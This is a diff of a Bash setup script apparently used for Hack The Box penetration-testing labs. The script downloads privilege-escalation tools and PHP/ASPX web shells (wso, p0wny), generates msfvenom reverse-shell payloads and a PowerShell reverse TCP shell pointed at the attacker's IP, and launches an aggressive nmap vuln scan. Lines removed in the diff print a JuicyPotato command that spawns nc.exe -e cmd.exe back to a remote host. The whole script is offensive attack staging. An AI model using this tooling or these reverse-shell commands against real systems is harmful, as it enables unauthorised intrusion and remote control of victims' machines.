@@ -20,6 +20,7 @@ echo -e "[!]\e[41mInstall Pre-requisites\e[0m[!] - Commented out by Default"
 #cargo install feroxbuster
 #sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
 #sudo pipx install git+https://github.com/Tib3rius/AutoRecon.git
+#sudo pip install one-lin3r
 echo  -e "[\e[41mCreating One-liners & SSH Keys\e[0m]"
 git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
 sed -i "s/10.0.0.1/$htbip/g" useful
@@ -32,8 +33,11 @@ echo ""
 echo -e "[\e[41mDownloading Enum Scripts.\e[0m]"
 cd www
 git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
+git clone https://github.com/s0md3v/Arjun arjun
 git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite temp
 git clone https://github.com/rebootuser/LinEnum temp
+git clone https://github.com/M4ximuss/Powerless temp
+git clone https://github.com/quentinhardy/odat.git oracle
 cd temp
 find ./ -name '*.exe' -exec cp -prv '{}' '../privesc/' ';'
 find ./ -name '*.sh' -exec cp -prv '{}' '../privesc/' ';'
@@ -43,6 +47,8 @@ rm -rf temp
 cd privesc
 rm -rf .git
 wget https://gist.githubusercontent.com/islanddog/c77b4567e1569c185d40e2decf02ca63/raw/e9096bbba8d44de315a15cd28b2895ffec1cc6a7/echo-cscript
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 cd ..
 echo ""
 echo -e "[\e[41mPulling Windows Exploits\e[0m]"
@@ -69,6 +75,7 @@ echo Invoke-PowerShellTcp -Reverse -IPAddress $htbip -Port 1234 >> Invoke-PowerS
 wget https://github.com/tennc/webshell/raw/master/aspx/wso.aspx
 wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
 wget https://gist.githubusercontent.com/islanddog/f20e0ca0e9cef1d70110a8d781eeaa28/raw/4206911d39aaeed7306b701d5e1cc1d13cb54ffa/uploader.php
+wget -O p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 cd ..
 mkdir shells
 cd shells
@@ -81,18 +88,11 @@ msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-123
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip  LPORT=1234 -f raw > shell-1234.jsp
 cd ..
 cd ..
-echo ""
-echo -e "[\e[41mManual Download Required for Updates\e[0m]"
-echo ""
-echo "MimiKatz"
-echo "https://github.com/gentilkiwi/mimikatz/releases/"
-echo ""
-echo "JuicyPotato"
-echo "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
-echo "JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a /c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443 -t *"
-echo ""
-echo "Default Port is 1234"
-echo "Setup Complete"
+echo "Setup Complete in $box Folder. Scanning using Rustscan now."
 cd ..
+cd $box
 #Have RustScan automatically scan the HTB VM
-rustscan --ulimit 5000 $box -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html
+rustscan --ulimit 5000 $box -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o $box-scan.html
+firefox $box-scan.html
+firefox useful
+exit
